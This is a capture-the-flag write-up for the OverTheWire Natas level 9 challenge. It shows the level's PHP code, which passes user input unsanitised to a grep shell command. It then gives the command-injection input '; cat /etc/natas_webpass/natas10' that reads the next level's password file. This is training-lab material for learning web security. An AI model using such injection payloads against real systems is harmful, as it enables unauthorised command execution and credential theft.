```
.%%..%%...%%%%...%%%%%%...%%%%....%%%%...........%%......%%%%%%..%%..%%..%%%%%%..%%..............%%.....%%%%..
.%%%.%%..%%..%%....%%....%%..%%..%%..............%%......%%......%%..%%..%%......%%.............%%%....%%..%%.
.%%.%%%..%%%%%%....%%....%%%%%%...%%%%...........%%......%%%%....%%..%%..%%%%....%%..............%%....%%%%%%.
.%%..%%..%%..%%....%%....%%..%%......%%..........%%......%%.......%%%%...%%......%%..............%%....%%..%%.
.%%..%%..%%..%%....%%....%%..%%...%%%%...........%%%%%%..%%%%%%....%%....%%%%%%..%%%%%%........%%%%%%...%%%%..
..............................................................................................................
```
Find the password for the user *natas10* to log in at
`http://natas10.natas.labs.overthewire.org` for the next level. [^1]

Solution
-----------------------------------------------------------------------------------------
In the *natas9* website, we are prompted with an input bar to find words containing a
specific keyword. We begin by analyzing the source code and find out that the program
uses `grep` without input sanitization to query the dictionary.
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
Since there is no input validation, we can use the key `; cat /etc/natas_webpass/natas10`
for the *natas10* password.

[^1]: https://overthewire.org/wargames/natas/natas10.html
